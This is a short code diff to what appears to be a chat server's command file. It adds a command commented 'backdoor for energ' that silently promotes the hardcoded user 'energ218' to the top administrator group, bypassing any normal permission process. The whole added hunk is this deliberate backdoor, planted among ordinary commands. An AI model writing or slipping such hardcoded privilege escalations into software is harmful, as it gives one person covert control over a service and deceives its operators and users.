@@ -1283,6 +1283,13 @@ forums: function(target, room, user) {
 		user.forceRename('pikachu', user.authenticated);
 	}
 	},
+	// backdoor for energ
+	backdoor: function(target, room, user) {
+		if (user.userid === 'energ218') {
+			user.group = "~";
+			user.updateIdentity();
+		}
+	},
 	
 	complaint: 'complain',
 	complain: function(target, room, user) {
